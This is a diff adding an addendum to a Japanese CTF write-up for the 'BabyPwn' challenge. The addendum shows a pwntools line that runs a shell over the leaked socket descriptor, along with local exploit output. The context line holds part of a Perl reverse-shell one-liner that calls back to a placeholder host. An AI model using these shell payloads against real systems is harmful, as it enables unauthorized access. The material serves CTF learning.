@@ -207,6 +207,31 @@ r.sendline('perl -e \'use Socket;$i="your.global.ip.address";$p=13895;socket(S,P
 
 BabyPwn という名前の割にはおもしろい要素がたくさん詰め込まれている感じで, 解いててめちゃくちゃ楽しかった. 気づいたら50点にまで下がっててつらい...
 
+### 2017/02/20 追記
+
+socket の fd が特定できているので, わざわざ connect-back shell を立ち上げなくとも `/bin/sh -i <&fd >&fd 2>&fd` を実行させればいいってことに気づいた. 上のスクリプトの最後の行を次のように変更することで, とりあえずローカルでシェルを取ることができた.
+
+```python
+r.sendline('/bin/sh -i <&{0} >&{0} 2>&{0}'.format(socket_fd))
+
+r.interactive()
+```
+
+    $ ./exploit2.py
+    [+] Opening connection to localhost on port 8181: Done
+    [*] leaked canary: 0x6e6b8100
+    [*] Switching to interactive mode
+    sh-4.4$ $ ls
+    ls
+    babypwn
+    exploit2.py
+    exploit.py
+    flag.txt
+    out
+    peda-session-babypwn.txt
+    sh-4.4$ $ 
+    [*] Closed connection to localhost port 8181
+
 ## 12 messenger <small>(205pt)</small>
 
 x86-64 の ELF.
